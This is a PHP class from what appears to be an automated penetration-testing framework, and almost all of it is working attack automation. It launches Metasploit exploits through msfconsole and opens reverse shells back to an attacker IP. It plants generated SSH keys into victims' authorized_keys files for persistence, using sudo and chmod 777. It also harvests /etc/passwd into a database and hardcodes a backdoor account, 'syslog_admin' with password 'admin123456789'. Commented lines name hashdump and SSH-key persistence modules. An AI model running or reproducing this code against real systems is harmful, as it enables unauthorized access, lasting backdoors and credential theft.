<?php

class SERVICE4COM extends AUTH {
    
    var $created_user_name;
    var $created_user_pass;
    
    public function __construct($eth,$domain,$ip,$port,$protocol) {
        parent::__construct($eth,$domain,$ip,$port,$protocol);	
        $this->created_user_name = "syslog_admin";
        $this->created_user_pass = "admin123456789";
    }
    
    
    public function msf2exec($file_exploit,$target_ip,$target_port,$attacker_ip,$attacker_port){
        
        // set AutoRunScript multiconsolecommand -cl \"getsystem\",\"getuid\"
        // set AutoRunScript multi_console_command -rc $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc
        // set AutoRunScript post/linux/gather/enum_system
        //$query = "echo \"run post/linux/gather/enum_users_history\nrun post/linux/gather/enum_system\nrun post/linux/gather/enum_configs\nrun post/linux/gather/enum_network\nrun post/linux/gather/enum_protections\nrun post/linux/gather/hashdump\nrun post/linux/manage/sshkey_persistence\" > $this->dir_tmp/$this->ip.$this->port.post_linux.rc";
        //$this->requette($query);
        
        $this->ssTitre(__FUNCTION__);

        $cmd = "";
        $file_exploit = trim($file_exploit);

        if (!empty($file_exploit)){
            $tab_payloads = $this->service8msf8exploit2payloads($file_exploit);
            if ($this->flag_poc){
            $this->article("ALL Payloads",$this->tab($tab_payloads));
            $this->msf2info($file_exploit);
            }
            foreach ($tab_payloads as $payload){
                $payload = trim($payload);
                if (!empty($payload)){
                    
                    
                    switch ($payload){
                        case "php/exec" :
                            $this->service8msf8exploit2payload2options($file_exploit, $payload);$this->pause();
                            $cmd = "use $file_exploit;set RHOSTS $target_ip;set RPORT $target_port;set payload php/exec;set CMD \"%CMD%\";run;exit";
                           break;
                            }
                    
                }
                
            }
            
            
            $query = "msfconsole -q -x '$cmd' 2> /dev/null " ;
            $this->pause();
            $this->article("msf>", $cmd);
            $this->pause();
            if (!empty($cmd)) return $query;
            else return $cmd;
        }
    }
    
    
    public function msf2search2exec($cve,$name,$platform,$app){
        $cve = trim($cve);
        
        $files_exploit = array();
        $this->ssTitre(__FUNCTION__);
        $shell = "/bin/bash";
        
        $attacker_ip = $this->ip4addr4target($this->ip);
        
        $files_exploit = array_filter($this->msf2cve($cve,$name,$platform,$app)) ;
        if (!empty($files_exploit)){
            foreach ($files_exploit as $file_exploit){
                if(!empty($file_exploit)){
                    $lport = rand(1024,65535);
                    $file_exploit = trim($file_exploit);
                    $this->article("EXEC $file_exploit", $cve);
                    $cmd_rev = $this->msf2exec($file_exploit,$this->ip,$this->port,$attacker_ip,$lport);
                    if (!empty($cmd_rev)){
                        $templateB64_shell = base64_encode(str_replace("%CMD%", "%SHELL%", $cmd_rev));
                        $lprotocol = 'T';
                        $type = 'server';
                        
                        $rev = $this->rev8fifo($attacker_ip, $lport, $shell) ; // OK Lampio
                        $cmd = str_replace("%CMD%", $rev, $cmd_rev);
                        $this->service4lan($cmd, $templateB64_shell, $lport, $lprotocol,$type);

                    }
                    
                }
            }
        }
        
    }

    
    public function service4authorized_keys($stream,$authorized_keys_filepath,$authorized_keys_str,$remote_username,$remote_userpass,$local_username,$local_home_user){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        $timeout = 10 ;
        $remote_username = trim($remote_username);
        
        $this->article("Remote Home User", $local_home_user);
        $this->article("Remote User2use", $remote_username);
        $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username.rsa.priv";
        $obj_file = new FILE($private_key_ssh_rsa_file);
        $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        $pass_phrase = '';
        $private_keys_str = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $pass_phrase);
        $public_keys_str = $this->key2gen4public("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file,$pass_phrase);
        
        $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
        $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,$this->filter_file_path);

        
        if (empty($authorized_keys_filepath)){

            $this->req_str($stream,"cd $local_home_user; whoami",$this->stream_timeout,"");
            $query = "cd $local_home_user; ls -al";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $this->req_str($stream," whoami",$this->stream_timeout,"");
            $this->req_str($stream,"cd $local_home_user; mkdir ./.ssh",$this->stream_timeout,"");
            $query = "cd $local_home_user; chmod 777 -R $local_home_user/.ssh";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $query = "cd $local_home_user; echo '$public_keys_str' > $local_home_user/.ssh/authorized_keys";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $query = "cd $local_home_user; ls -al $local_home_user/.ssh";
            $this->req_str($stream,$query,$this->stream_timeout,"");

            
            $query = "chown $local_username  $local_home_user/.ssh/authorized_keys";
            //$this->req_str($stream,$query,$this->stream_timeout,"");

            
            $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
            $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,$this->filter_file_path);

        }
       
        if (!empty($authorized_keys_filepath)){
            
            if ($remote_username === "root" ) $password2use = $this->root_passwd;
            else $password2use = $this->created_user_pass ;
            
            if ($this->keys4check($stream,$remote_username, $password2use,$authorized_keys_filepath, $public_keys_str)!==FALSE){
            
            $ssh_ports = $this->ip2ports4service("ssh");
            foreach ($ssh_ports as $ssh_open)
            if(!empty($ssh_open)) {

                $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $local_username, $private_key_ssh_rsa_file,"");
                if(is_resource($stream)){
                    $info = "SSH Private Key:$private_key_ssh_rsa_file";
                    $this->log2succes($info);
                    $template_shell = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $local_username@$this->ip -p $ssh_open -C  '%SHELL%'";
                    $templateB64_shell = base64_encode($template_shell);
                    $attacker_ip = $this->ip4addr4target($this->ip);
                    $attacker_port = rand(1024,65535);
                    $shell = "/bin/bash";
                    $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
                    $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
                    $lport = $ssh_open;
                    $lprotocol = 'T' ;
                    $type = "server";
                    $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
                }
            
            }
            
        }

        }
        return $result;
    }
    
    
    public function keys4check($stream,$remote_username,$password2use,$authorized_keys_filepath,$key2search):bool{
        $this->ssTitre(__FUNCTION__);

        $query = "cat $authorized_keys_filepath";
        $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout,""));
        $this->pause();
        
        
        if(stristr($authorized_keys_str,$key2search)!==FALSE) {
            $this->log2succes("FOUND Public key - already exist");
            return TRUE ;
        }
        else {
            $chaine = "Try to Add Public key\n";
            $this->note($chaine);
            if (!empty($password2use)) $data = "echo '$this->$password2use' | sudo -S -u $remote_username /bin/bash -c \"echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath \" ";
            else $data = "echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath ";
            
            $this->req_str($stream,$data,$this->stream_timeout,"");
            
            if (!empty($password2use)) $data = "echo '$this->$password2use' | sudo -S -u $remote_username /bin/bash -c \"echo '$key2search' | tee -a $authorized_keys_filepath \"";
            else $data = "echo '$key2search' | tee -a $authorized_keys_filepath ";
            
            $this->req_str($stream,$data,$this->stream_timeout,"");
            $this->pause();
            $query = "cat $authorized_keys_filepath";
            $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout,""));
            $this->pause();
            if(stristr($authorized_keys_str,$key2search)!==FALSE) {
                $this->log2succes("Succes ADD Keys");
                return TRUE ;
            }
            else {
                $this->log2error("Failed to ADD Keys");
                return FALSE ;
            }
        }
        
    }
    
    public function service4lan($cmd_rev,$templateB64_shell,$lport,$lprotocol,$type){
        $templateB64_cmd = base64_encode(str_replace("%SHELL%", "%CMD%", base64_decode($templateB64_shell)));
        $cmd1 = "php pentest.php LAN '$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_cmd $templateB64_shell $type 30 listening_Server' ";
        $this->article("cmd1", $cmd1);
        $this->article("cmd2", $cmd_rev);
        
        $time = $this->stream_timeout*3 ;       
        if ($type=="client") $this->exec_parallel($cmd_rev, $cmd1, $time);
        if ($type=="server") $this->exec_parallel($cmd1, $cmd_rev, $time);
    }
    

    
    public function parse4etc_passwd($strings_etc_passwd){
        $this->ssTitre(__FUNCTION__);
        $user = array();
        $lines_tab = explode("\n", $strings_etc_passwd);
        foreach ($lines_tab as $line){
            if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{0,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):(?<user2shell>[[:print:]]{1,})|',$line,$user))
            {
                $this->yesUSERS($this->port2id, $user['user2name'], "cat /etc/passwd", $line);                
                $where = "id8port = '$this->port2id' AND user2name = '$user[user2name]' ";
                $query = "UPDATE AUTH SET user2uid='$user[user2uid]',user2gid='$user[user2gid]',user2def='$user[user2full_name]',user2home='$user[user2home]',user2shell='$user[user2shell]' WHERE $where ;";
                $this->mysql_ressource->query($query);
                $this->tab_users_etc_passwd[] = $user['user2name'];
            }
            
            if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{0,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):/bin/bash|',$line,$user))
            {
                $this->tab_users_shell[] = $user['user2name'];
            }
            if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{0,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):/bin/sh|',$line,$user))
            {
                $this->tab_users_shell[] = $user['user2name'];
            }
            
            
        }
        
        //sort($this->tab_users_etc_passwd);
        if (!empty($this->tab_users_etc_passwd)) $this->tab_users_etc_passwd = array_filter(array_unique($this->tab_users_etc_passwd));
        $this->article("All Users /etc/passwd","\n".$this->tab($this->tab_users_etc_passwd));
        
        //sort($this->tab_users_shell);
        if (!empty($this->tab_users_shell)) $this->tab_users_shell = array_filter(array_unique($this->tab_users_shell));
        $this->article("All Users SHELL","\n".$this->tab($this->tab_users_shell));        
    }
    
    public function service8msf($exploit_rc,$lport,$lprotocol,$info,$type,$timeout) {
        // msfvenom -l payloads | grep "cmd/unix/" | awk '{print $1}'
        // cmd/unix/interact
        $type = strtolower(trim($type)) ;
        $cmd1 = "msfconsole -q -y /usr/share/metasploit-framework/config/database.yml -r $exploit_rc  2> /dev/null ";
        $cmd2 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol ".base64_encode($template)." server 30 listening_Server\" ";
        
        if ($type=="client") $this->exec_parallel($cmd1, $cmd2, 5); 
        if ($type=="server") $this->exec_parallel($cmd2, $cmd1, 5); 
    }
    
    
    public function service8msf8exploit2payloads($exploit){
        $exploit = trim($exploit);
        $rst = array();
        $query = "msfconsole -q  -x \"use $exploit;show payloads;exit;\" 2> /dev/null  | grep '/' | awk '{print $2}'";
        if (!empty($exploit)) return $this->req_ret_tab($query);
        else return $rst;
    }
    
    public function service8msf8exploit2payload2options($exploit,$payload){
        $exploit = trim($exploit);
        $payload = trim($payload);
        $query = "msfconsole -q -x \"use $exploit;set payload $payload;show options;exit;\" 2> /dev/null  ";
        if ( (!empty($exploit)) && (!empty($payload)) ) return $this->req_ret_str($query);
        else return "";
    }
    

    
    public function service8lan4user($lan2whois){
        $lan2whois = trim($lan2whois);
        $tab_templateB64_id = array();
        $sql_r = "SELECT templateB64_id FROM LAN WHERE id8port = '$this->port2id' AND uid_name = '$lan2whois' AND from_base64(templateB64_id) LIKE \"%ID%\"";
        echo "$sql_r\n";
        $req = $this->mysql_ressource->query($sql_r);
        while ($row = $req->fetch_assoc()) {
            $tab_templateB64_id[] = $row['templateB64_id'];
        }
        $tab_templateB64_id = array_filter($tab_templateB64_id);
        return $tab_templateB64_id;
    }
    
    public function service8lan(){
        $tab_whois8service = array();
        $sql_r = "SELECT uid_name,templateB64_id FROM LAN WHERE id8port = '$this->port2id' ";
        echo "$sql_r\n";
        $req = $this->mysql_ressource->query($sql_r);
        while ($row = $req->fetch_assoc()) {
            $tab_whois8service[] = [$row['uid_name'] => $row['templateB64_id']];
        }
        return $tab_whois8service;
    }

    
    
    public function yesUSERS($id8port,$user2name,$user2methode,$user2infos) {
        $id8port = trim($id8port);
        $user2name = trim($user2name);
        $user2methode = trim($user2methode);
        $user2infosB64 = base64_encode($user2infos);
        $user = array();
        
        if (preg_match('/(?<user2name>[[:print:]]{1,})/',$user2name,$user))
        {
            $user2name =  $user['user2name'];
            
        }
        else return $this->log2error("No User : $user2name");
        
        $sql_r = "SELECT id8port,user2name,user2methode,user2infos FROM USERS WHERE id8port = $id8port AND user2name = '$user2name' AND user2methode = '$user2methode' AND user2infos = '$user2infosB64' ";
        //echo "$sql_r\n";
        if (!$this->checkBD($sql_r)) {
            $sql_w = "INSERT INTO USERS (id8port,user2name,user2methode,user2infos) VALUES ($id8port,'$user2name','$user2methode','$user2infosB64');";
            $this->mysql_ressource->query($sql_w);
            $chaine = "YES USERS = $id8port:$user2name:$user2methode:$user2infos";
            $this->note($chaine) ;
            //$this->notify($chaine);
            //echo "$sql_w\n";$this->pause();
        }
    }
    
    
    
    public function  port2root($template_b64){
        $this->ssTitre(__FUNCTION__);
        $chaine = "YES ROOT on $this->ip:$this->port with ".base64_decode($template_b64);
        $this->log2succes($chaine);
        $sql_ip = "UPDATE IP SET ip2root=1 WHERE $this->ip2where  ";
        $this->mysql_ressource->query($sql_ip);  
        $this->port2shell($template_b64);
    }
    
    public function  port2read($template_b64){
        $this->ssTitre(__FUNCTION__);
        $chaine = "YES READ on $this->ip:$this->port with ".base64_decode($template_b64);
            $this->log2succes($chaine);
            $sql_ip = "UPDATE IP SET ip2read=1 WHERE $this->ip2where  ";
            $this->mysql_ressource->query($sql_ip);
    }
    
    public function  port2write($template_b64){      
        $this->ssTitre(__FUNCTION__);
        $chaine = "YES WRITE on $this->ip:$this->port with ".base64_decode($template_b64);
        $this->log2succes($chaine);
        $sql_ip = "UPDATE IP SET ip2write=1 WHERE $this->ip2where  ";
        $this->mysql_ressource->query($sql_ip);
        $this->port2read($template_b64);
       }
    
    
    public function  port2shell($template_b64){
        $this->ssTitre(__FUNCTION__);

            $chaine = "YES SHELL on $this->ip:$this->port with ".base64_decode($template_b64);
            $this->log2succes($chaine);
            $sql_ip = "UPDATE IP SET ip2shell=1 WHERE $this->ip2where  ";
            $this->mysql_ressource->query($sql_ip);
            //$this->port2write($template_b64);

        
    }
    
    
    
    public function key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd){
        if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -outform pem -text -out $private_key_file.pem",$this->stream_timeout,"");
        else $this->req_str($stream,"openssl rsa -in $private_key_file -outform pem -text -out $private_key_file.pem",$this->stream_timeout,"");
        
        $this->req_str($stream,"ls -al $private_key_file.pem",$this->stream_timeout,"");
        $this->req_str($stream,"file $private_key_file.pem",$this->stream_timeout,"");
        $this->req_str($stream,"head -5 $private_key_file.pem",$this->stream_timeout,"");
        return "$private_key_file.pem";
    }

    
    public function key2gen4priv($stream,$timeout,$private_key_file,$private_key_passwd){
        $this->ssTitre ( "Gen Private key " );
        $query = "openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out $private_key_file" ;
        if(!file_exists($private_key_file)) $this->requette($query);
        else $this->cmd("localhost", $query);
        
        $query = "openssl rsa -check -in $private_key_file";
        $this->req_str($stream,$query,$this->stream_timeout,"");
        $query = "openssl rsa -in $private_key_file -text -noout";
        //$this->req_str($stream,$query,$timeout,"");
        $this->req_str($stream,"ls -al $private_key_file",$this->stream_timeout,"");
        $this->req_str($stream,"file $private_key_file",$this->stream_timeout,"");
        $this->key2gen4priv2pem($stream,$this->stream_timeout,$private_key_file,$private_key_passwd);
        return trim($this->req_str($stream,"head -5 $private_key_file",$this->stream_timeout,"" ));
    }
    
    
    
    public function key2gen4public($stream,$timeout,$private_key_file, $public_key_file, $private_key_passwd){
        $this->ssTitre ( "Gen Public key" );
        $public_key_str = "";
        if (empty($private_key_file)) {
            $this->log2error("Empty Private key");
            return $public_key_str;
        }
        var_dump($private_key_passwd);
        if(!file_exists($public_key_file)) {    
            
            if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -pubout -out $public_key_file.tmp",$this->stream_timeout,"");
            else $this->req_str($stream,"openssl rsa -in $private_key_file -pubout -out $public_key_file.tmp",$timeout ,"");
            $this->req_str($stream,"head -5 $public_key_file.tmp",$timeout,"" );
            $this->req_str($stream,"ssh-keygen -i -m PKCS8 -f $public_key_file.tmp > $public_key_file ",$timeout,"");
            
        }
        
        $this->req_str($stream,"ssh-keygen -l -f $public_key_file ",$timeout,"");
        $this->req_str($stream,"ls -al $public_key_file",$timeout,"");
        $this->req_str($stream,"file $public_key_file",$timeout,"");
        return trim($this->req_str($stream,"head -5 $public_key_file",$timeout,""));
        
    }
    
    

    

    
    
}

?>